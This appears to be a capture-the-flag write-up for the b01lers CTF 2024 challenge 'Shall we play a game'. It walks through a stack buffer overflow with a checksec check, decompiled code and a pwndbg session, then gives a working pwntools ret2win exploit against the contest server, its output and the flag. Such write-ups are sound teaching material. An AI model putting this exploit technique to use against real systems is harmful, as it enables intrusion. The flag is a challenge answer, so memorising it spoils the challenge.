---
linkTitle: Shall we play a game
title: Shall we play a game [Writeup]
type: docs
math: True
weight: 6
---
## Challenge Description
> Shall we play a game?

## Solution 
The challenge files provided to us include a `Dockerfile` and a binary. We could inspect the file properties of this binary.

```bash
fooker@fooker:~/ctfs/b01lersctf2024/shall-we-play-a-game$ file chal
chal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=965b8ed1abf621f44bb3c06b75e6b7b55e519de0, for GNU/Linux 3.2.0, not stripped
fooker@fooker:~/ctfs/b01lersctf2024/shall-we-play-a-game$
```

Fortunately, the binary is not stripped. Next, we should take a look at the security mitigations applied on this binary.

```bash
fooker@fooker:~/ctfs/b01lersctf2024/shall-we-play-a-game$ checksec chal
[*] '~/ctfs/b01lersctf2024/shall-we-play-a-game/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
fooker@fooker:~/ctfs/b01lersctf2024/shall-we-play-a-game$
```

As depicted in the snippet above, we do not have a stack protection and the binary is not a position independent executable! Let's look at the decompilation produced by IDA for the provided binary. There's a particularly interesting function that could be spotted in the decompilation (apart from the main function). 

```c {filename=chal.c, linenos=table}
int global_thermo_nuclear_war()
{
  char s[264]; // [rsp+0h] [rbp-110h] BYREF
  FILE *stream; // [rsp+108h] [rbp-8h]

  stream = fopen("flag.txt", "r");
  if ( !stream )
    return puts("flag.txt not found");
  fgets(s, 256, stream);
  return puts(s);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[48]; // [rsp+0h] [rbp-B0h] BYREF
  char v5[48]; // [rsp+30h] [rbp-80h] BYREF
  char s[16]; // [rsp+60h] [rbp-50h] BYREF
  char v7[64]; // [rsp+70h] [rbp-40h] BYREF

  setbuf(stdout, 0LL);
  puts("GREETINGS PROFESSOR FALKEN.");
  fgets(s, 19, stdin);
  puts("HOW ARE YOU FEELING TODAY?");
  fgets(v5, 35, stdin);
  puts("EXCELLENT. IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE\nREMOVAL OF YOUR USER ACCOUNT ON 6/23/73?");
  fgets(v4, 35, stdin);
  puts("SHALL WE PLAY A GAME?");
  fgets(v7, 86, stdin);
  return 0;
}

```

From what it seems like, this should be a straight-forward ret2win attack since we have a buffer overflow (Line 28). Therefore, we just need the
offset of the character buffer `v7` from the base pointer before crafting the payload!

### Buffer Overflow

I'll set a breakpoint right after the last `fgets()` and read in a few bytes of recognisable garbage into the target buffer that we want to overflow. 

```bash
pwndbg> break *main + 194
Breakpoint 1 at 0x40130c
pwndbg> r
Starting program: ~/ctfs/b01lersctf2024/shall-we-play-a-game/chal
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
GREETINGS PROFESSOR FALKEN.
test
HOW ARE YOU FEELING TODAY?
test
EXCELLENT. IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE
REMOVAL OF YOUR USER ACCOUNT ON 6/23/73?
test
SHALL WE PLAY A GAME?
AAAAAAAAAAAAAAAA

Breakpoint 1, 0x000000000040130c in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────
*RAX  0x7fffffffd810 ◂— 'AAAAAAAAAAAAAAAA\n'
 RBX  0x0
*RCX  0x4052b1 ◂— 0x0
*RDX  0xfbad2288
*RDI  0x7ffff7f9ea80 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x4052a1 ◂— 'AAAAAAAAAAAAAAA\n'
 R8   0x0
 R9   0x0
*R10  0x77
*R11  0x246
*R12  0x7fffffffd968 —▸ 0x7fffffffdbed ◂— '~/ctfs/b01lersctf2024/shall-we-play-a-game/chal'
*R13  0x40124a (main) ◂— endbr64
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x7fffffffd850 ◂— 0x1
*RSP  0x7fffffffd7a0 ◂— 0xa74736574 /* 'test\n' */
*RIP  0x40130c (main+194) ◂— mov eax, 0
────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────
 ► 0x40130c       <main+194>                      mov    eax, 0
   0x401311       <main+199>                      leave
   0x401312       <main+200>                      ret
    ↓
   0x7ffff7dabd90 <__libc_start_call_main+128>    mov    edi, eax
   0x7ffff7dabd92 <__libc_start_call_main+130>    call   exit                <exit>

   0x7ffff7dabd97 <__libc_start_call_main+135>    call   __nptl_deallocate_tsd                <__nptl_deallocate_tsd>

   0x7ffff7dabd9c <__libc_start_call_main+140>    lock dec dword ptr [rip + 0x1f0505]  <__nptl_nthreads>
   0x7ffff7dabda3 <__libc_start_call_main+147>    sete   al
   0x7ffff7dabda6 <__libc_start_call_main+150>    test   al, al
   0x7ffff7dabda8 <__libc_start_call_main+152>    jne    __libc_start_call_main+168                <__libc_start_call_main+168>

   0x7ffff7dabdaa <__libc_start_call_main+154>    mov    edx, 0x3c
─────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffd7a0 ◂— 0xa74736574 /* 'test\n' */
01:0008│-0a8 0x7fffffffd7a8 ◂— 0x0
... ↓        3 skipped
05:0028│-088 0x7fffffffd7c8 —▸ 0x7ffff7fe48e0 (dl_main) ◂— endbr64
06:0030│-080 0x7fffffffd7d0 ◂— 0xa74736574 /* 'test\n' */
07:0038│-078 0x7fffffffd7d8 ◂— 0x1
───────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► 0         0x40130c main+194
   1   0x7ffff7dabd90 __libc_start_call_main+128
   2   0x7ffff7dabe40 __libc_start_main+128
   3         0x4010d5 _start+37
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> stack 40 -10
00:0000│-100 0x7fffffffd750 ◂— 0x0
01:0008│-0f8 0x7fffffffd758 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
02:0010│-0f0 0x7fffffffd760 —▸ 0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
03:0018│-0e8 0x7fffffffd768 —▸ 0x7ffff7e01410 (fgets+144) ◂— mov edx, dword ptr [rbp]
04:0020│-0e0 0x7fffffffd770 ◂— 0x0
05:0028│-0d8 0x7fffffffd778 —▸ 0x7fffffffd850 ◂— 0x1
06:0030│-0d0 0x7fffffffd780 —▸ 0x7fffffffd968 —▸ 0x7fffffffdbed ◂— '~/ctfs/b01lersctf2024/shall-we-play-a-game/chal'
07:0038│-0c8 0x7fffffffd788 —▸ 0x40124a (main) ◂— endbr64
08:0040│-0c0 0x7fffffffd790 —▸ 0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401160 (__do_global_dtors_aux) ◂— endbr64
09:0048│-0b8 0x7fffffffd798 —▸ 0x40130c (main+194) ◂— mov eax, 0
0a:0050│ rsp 0x7fffffffd7a0 ◂— 0xa74736574 /* 'test\n' */
0b:0058│-0a8 0x7fffffffd7a8 ◂— 0x0
... ↓        3 skipped
0f:0078│-088 0x7fffffffd7c8 —▸ 0x7ffff7fe48e0 (dl_main) ◂— endbr64
10:0080│-080 0x7fffffffd7d0 ◂— 0xa74736574 /* 'test\n' */
11:0088│-078 0x7fffffffd7d8 ◂— 0x1
... ↓        2 skipped
14:00a0│-060 0x7fffffffd7f0 —▸ 0x400040 ◂— 0x400000006
15:00a8│-058 0x7fffffffd7f8 —▸ 0x7ffff7fe283c (_dl_sysdep_start+1020) ◂— mov rax, qword ptr [rsp + 0x58]
16:00b0│-050 0x7fffffffd800 ◂— 0xa74736574 /* 'test\n' */
17:00b8│-048 0x7fffffffd808 —▸ 0x7fffffffdbc9 ◂— 0x258f12e39ae584c9
18:00c0│ rax 0x7fffffffd810 ◂— 'AAAAAAAAAAAAAAAA\n'
19:00c8│-038 0x7fffffffd818 ◂— 'AAAAAAAA\n'
1a:00d0│-030 0x7fffffffd820 ◂— 0xa /* '\n' */
1b:00d8│-028 0x7fffffffd828 ◂— 0x1f8bfbff
1c:00e0│-020 0x7fffffffd830 —▸ 0x7fffffffdbd9 ◂— 0x34365f363878 /* 'x86_64' */
1d:00e8│-018 0x7fffffffd838 ◂— 0x64 /* 'd' */
1e:00f0│-010 0x7fffffffd840 ◂— 0x1000
1f:00f8│-008 0x7fffffffd848 —▸ 0x4010b0 (_start) ◂— endbr64
20:0100│ rbp 0x7fffffffd850 ◂— 0x1
21:0108│+008 0x7fffffffd858 —▸ 0x7ffff7dabd90 (__libc_start_call_main+128) ◂— mov edi, eax
22:0110│+010 0x7fffffffd860 ◂— 0x0
23:0118│+018 0x7fffffffd868 —▸ 0x40124a (main) ◂— endbr64
24:0120│+020 0x7fffffffd870 ◂— 0x1ffffd950
25:0128│+028 0x7fffffffd878 —▸ 0x7fffffffd968 —▸ 0x7fffffffdbed ◂— '~/ctfs/b01lersctf2024/shall-we-play-a-game/chal'
26:0130│+030 0x7fffffffd880 ◂— 0x0
27:0138│+038 0x7fffffffd888 ◂— 0x86ad38d03382c7d2
pwndbg>
```

As we can observe from the above snippet, the buffer pointer reads `0x7fffffffd810` which is `[rbp - 0x40]`. Hence, we need to read in `72` bytes of garbage followed by the return address of the win function! Here's the exploit for the same!

```py {filename=exploit.py, linenos=table}
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
# libc = ELF("./libc.so.6", checksec = False)
# ld = ELF("./ld-2.27.so", checksec = False)

context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

host, port = 'chal.amt.rs', 1338

def initialize(argv=[]):
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

r = initialize()
# =========================================================
#                         EXPLOITS
# =========================================================

r.sendlineafter(b'FALKEN', b'test')
r.sendlineafter(b'?', b'test')
r.sendlineafter(b'?', b'test')

payload = flat({
    72: elf.sym['global_thermo_nuclear_war']
})

r.sendline(payload)

r.interactive()

```

and here's the result of the exploit!

```bash
fooker@fooker:~/ctfs/b01lersctf2024/shall-we-play-a-game$ python3 e
xploit.py
[*] '~/ctfs/b01lersctf2024/shall-we-play-a-game/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './chal': pid 1620951
[DEBUG] Received 0x1c bytes:
    b'GREETINGS PROFESSOR FALKEN.\n'
[DEBUG] Sent 0x5 bytes:
    b'test\n'
[DEBUG] Received 0x1b bytes:
    b'HOW ARE YOU FEELING TODAY?\n'
[DEBUG] Sent 0x5 bytes:
    b'test\n'
[DEBUG] Received 0x5f bytes:
    b"EXCELLENT. IT'S BEEN A LONG TIME. CAN YOU EXPLAIN THE\n"
    b'REMOVAL OF YOUR USER ACCOUNT ON 6/23/73?\n'
[DEBUG] Sent 0x5 bytes:
    b'test\n'
[DEBUG] Sent 0x51 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  dd 11 40 00  00 00 00 00  │qaaa│raaa│··@·│····│
    00000050  0a                                                  │·│
    00000051
[*] Switching to interactive mode

[DEBUG] Received 0x4f bytes:
    b'SHALL WE PLAY A GAME?\n'
    b'bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}\n'
    b'\n'
SHALL WE PLAY A GAME?
bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}

[*] Got EOF while reading in interactive
$
```

## Flag
```
bctf{h0w_@bo0ut_a_n1ce_g@m3_0f_ch3ss?_ccb7a268f1324c84}
```